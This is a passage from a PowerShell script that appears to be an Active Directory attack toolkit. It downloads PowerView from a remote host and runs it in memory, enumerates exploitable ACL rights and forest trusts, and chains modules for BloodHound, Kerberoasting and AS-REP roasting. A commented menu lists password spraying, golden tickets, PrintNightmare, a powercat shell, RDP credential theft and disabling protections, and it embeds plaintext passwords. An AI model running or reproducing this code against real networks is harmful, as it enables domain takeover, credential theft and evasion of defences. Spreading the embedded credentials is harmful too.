            Write-Host $aceString
        }
    }

    # Display formatted commands for GenericAll for groups
    foreach ($command in $groupGenericAllCommands) {
        Write-Host "GenericAll (Group): $command" -ForegroundColor Yellow
    }

    # Display formatted commands for WriteDacl with Add-DomainObjectAcl command before the net group commands for groups
    foreach ($command in $groupAddDomainAclCommands) {
        Write-Host "WriteDacl (Group): $command" -ForegroundColor Cyan
    }

    foreach ($command in $groupWriteDaclCommands) {
        Write-Host "WriteDacl (Group): $command" -ForegroundColor Cyan
    }

    # Display formatted commands for GenericWrite for groups
    foreach ($command in $groupGenericWriteCommands) {
        Write-Host "GenericWrite (Group): $command" -ForegroundColor Green
    }
}


function enum_dangerous_rights_all_users {
    # Import PowerView script
    IEX (New-Object Net.WebClient).DownloadString($uri + '/powerview.ps1')

    # Get the domain name
    $domain = (Get-Domain).Name.Split('.')[0]
    
    # Print the domain for debugging
    Write-Host "Using domain: $domain"

    # Get all domain users
    $users = Get-DomainUser

    # Print the list of users for debugging
    $users | ForEach-Object { Write-Host "Found user: $($_.SamAccountName)" }

    # Call enum_dangerous_rights for each user with the correct domain prefix
    foreach ($user in $users) {
        $userAccount = "$domain\$($user.SamAccountName)"
        Write-Host "Processing user: $userAccount"
        enum_dangerous_rights -userAccount $userAccount
    }
}

function enum_enumeration_in_the_forest {
    # Import PowerView script
    IEX (New-Object Net.WebClient).DownloadString($uri + '/powerview.ps1')

    # Run the nltest command to get the list of trusted domains
    $trustedDomains = nltest /trusted_domains
    
    # Get the current timestamp
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%M-%S"

    # Define the filename for trusted domains with timestamp
    $filenameTrustedDomains = "enum_nltest_trusted_domains_$timestamp.txt"
    $filepathTrustedDomains = Join-Path -Path $p -ChildPath $filenameTrustedDomains

    # Print the trusted domains for debugging
    Write-Host "Trusted Domains:"
    Write-Host $trustedDomains

    # Save the trusted domains output to a file with the timestamp
    $trustedDomains | Out-File -FilePath $filepathTrustedDomains

    # Get all trust relationships
    $trustRelationships = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

    # Define the filename for trust relationships with timestamp
    $filenameTrustRelationships = "enum_trust_relationships_$timestamp.txt"
    $filepathTrustRelationships = Join-Path -Path $p -ChildPath $filenameTrustRelationships

    # Print the trust relationships for debugging
    Write-Host "Trust Relationships:"
    Write-Host $trustRelationships

    # Save the trust relationships output to a file with the timestamp
    $trustRelationships | Out-File -FilePath $filepathTrustRelationships

    # Get domain trust information using PowerView
    $domainTrustsAPI = Get-DomainTrust -API

    # Define the filename for domain trusts (API) with timestamp
    $filenameDomainTrustsAPI = "enum_domain_trusts_api_$timestamp.txt"
    $filepathDomainTrustsAPI = Join-Path -Path $p -ChildPath $filenameDomainTrustsAPI

    # Print the domain trusts (API) for debugging
    Write-Host "Domain Trusts (API):"
    Write-Host $domainTrustsAPI

    # Save the domain trusts (API) output to a file with the timestamp
    $domainTrustsAPI | Out-File -FilePath $filepathDomainTrustsAPI

    # Get domain trust information using PowerView (without API)
    $domainTrusts = Get-DomainTrust

    # Define the filename for domain trusts (without API) with timestamp
    $filenameDomainTrusts = "enum_domain_trusts_$timestamp.txt"
    $filepathDomainTrusts = Join-Path -Path $p -ChildPath $filenameDomainTrusts

    # Print the domain trusts (without API) for debugging
    Write-Host "Domain Trusts (without API):"
    Write-Host $domainTrusts

    # Save the domain trusts (without API) output to a file with the timestamp
    $domainTrusts | Out-File -FilePath $filepathDomainTrusts

}


function enum_going_beyond_the_forest_trust {
    # Import PowerView script
    IEX (New-Object Net.WebClient).DownloadString($uri + '/powerview.ps1')

    # Get the current timestamp
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%M-%S"

    # Define the filename for the output
    $filename = "enum-going-beyond-the-forest-$timestamp.txt"
    $filepath = Join-Path -Path $p -ChildPath $filename

    # Initialize the output content with the timestamp
    $outputContent = "Timestamp: $timestamp`n`n"

    # Get all trust relationships in the current forest
    $forestTrustRelationships = ([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()
    $outputContent += "Forest Trust Relationships:`n"
    $outputContent += $forestTrustRelationships | Out-String
    $outputContent += "`n`n"

    # Extract the SourceName and TargetName from the trust relationships
    $sourceName = $forestTrustRelationships.SourceName
    $targetName = $forestTrustRelationships.TargetName
    $outputContent += "SourceName: ${sourceName}`n"
    $outputContent += "TargetName: ${targetName}`n`n"

    # Get domain trust information for the SourceName
    $domainTrustSource = Get-DomainTrust -Domain $sourceName
    $outputContent += "Domain Trusts for ${sourceName}:`n"
    $outputContent += $domainTrustSource | Out-String
    $outputContent += "`n`n"

    # Get domain trust mapping
    $domainTrustMapping = Get-DomainTrustMapping
    $outputContent += "Domain Trust Mapping:`n"
    $outputContent += $domainTrustMapping | Out-String
    $outputContent += "`n`n"

    # Get domain user information for the TargetName
    $domainUsersTarget = Get-DomainUser -Domain $targetName
    $outputContent += "Domain Users for ${targetName}:`n"
    $outputContent += $domainUsersTarget | Out-String
    $outputContent += "`n`n"

    # Get foreign group members for the TargetName
    $foreignGroupMembers = Get-DomainForeignGroupMember -Domain $targetName
    $outputContent += "Foreign Group Members for ${targetName}:`n"
    $outputContent += $foreignGroupMembers | Out-String
    $outputContent += "`n`n"

    # Convert SIDs of foreign group members to readable names
    foreach ($member in $foreignGroupMembers) {
        $memberSid = $member.MemberName
        if ($memberSid) {
            try {
                $memberName = ConvertFrom-SID $memberSid
                $outputContent += "SID: ${memberSid} => Name: ${memberName}`n"
            } catch {
                $outputContent += "SID: ${memberSid} could not be converted`n"
            }
        } else {
            $outputContent += "SID: ${memberSid} is null or empty`n"
        }
    }
    $outputContent += "`n`n"

    # Discover groups in the current forest with members from the target domain
    $outputContent += "Groups with Members from ${targetName}:`n"
    $groups = Get-DomainGroup | Select-Object -ExpandProperty samaccountname
    foreach ($group in $groups) {
        try {
            $members = Get-DomainGroupMember -Identity $group -ErrorAction SilentlyContinue
            foreach ($member in $members) {
                if ($member.memberdomain -eq $targetName) {
                    $resolvedName = $null
                    try {
                        $resolvedName = ConvertFrom-SID $member.MemberSID
                    } catch {
                        $resolvedName = $member.MemberName
                    }
                    $outputContent += "Group: ${group}, Member: ${resolvedName}, Domain: ${sourceName}`n"
                }
            }
        } catch {
            $outputContent += "Error getting members for group: ${group}`n"
        }
    }
    $outputContent += "`n`n"

    # Write the output content to the file
    $outputContent | Out-File -FilePath $filepath

    # Print a message indicating that the output has been written to the file
    Write-Host "Output has been written to $filepath"
}

function Convert-StringSidToBinary {
 param (
 [Parameter(Mandatory=$true, Position=0)]
 [string]$StringSid
 )

 $sid = New-Object System.Security.Principal.SecurityIdentifier $StringSid
 $binarySid = New-Object byte[] ($sid.BinaryLength)
 $sid.GetBinaryForm($binarySid, 0)
        
 $binarySidHex = ($binarySid | ForEach-Object { $_.ToString("X2") }) -join ''
 echo "0x$($binarySidHex.ToLower())"
}

function enum_allthethings{
    bloodhound
    bloodhound-ce
    enum_local
    enum_computers
    enum_sqlservers
    enum_webservers
    enum_domadmins
    enum_users
    enum_groups
    enum_groups_resolvenested
    enum_enumeration_in_the_forest
    enum_going_beyond_the_forest_trust
    enum_getspns
    enum_laps
    hostrecon
    kerberoast
    asreproast
    enum_adpeas
    enum_ADRecon
    sharppack
    enum_powerview
    enum_adenum
    enum_directory_structure
    enum_dangerous_rights_all_users
    zip_files -path $p
}

#pullfiles
#enum_allthethings
#enum_local
#enum_computers
#enum_domadmins
#enum_specificgroup
#enum_groups
#enum_getspns
#enum_groups_toplevel
#enum_groups_resolvenested
#enum_enumeration_in_the_forest
#enum_going_beyond_the_forest_trust
#enum_users
#enum_specificuser
#enum_adpeas
#enum_adenum
#enum_ADRecon
#printnightmare
#hostrecon
#kerberoast
#asreproast
#password_spray
#enum_webservers
#enum_sqlservers
#enum_inveigh
#find_PSRemotingLocalAdmin
#find_WMILocalAdmin
#bloodhound
#bloodhound -domain domain.com
#bloodhound-ce
#bloodhound-ce -domain domain.com
#enum_laps
#shell_powercat
#group3r
#sharppack
#enum_powerview
#enum_uac_fodhelper
#enum_uac_fodrunner
#zip_files -path $p
#cats_inmem
#golden_ticket
#golden_ticket_trust_key
#enumerate_sql -u webapp11 -p 89543dfGDFGH4d
#enumerate_sql
#rdp_thief
#enum_directory_structure
#enum_specific_domain comply.com
#Convert-StringSidToBinary S-1-5-21-2570265163-3918697770-3667495639-1235


### remember that this needs to be run in the context of the domain authed user, so be sure to include the domain in the xfreerdpsession
#enum_dangerous_rights -userAccount "prod\offsec" #may not work with something like prod.corp1.com
#enum_dangerous_rights_all_users


#run_adalanche
#run_adalanche -domain "domain.com"

#enum_allthethings
#disable_protections  #usr: manhattn:Password1!
#cats
#privesc
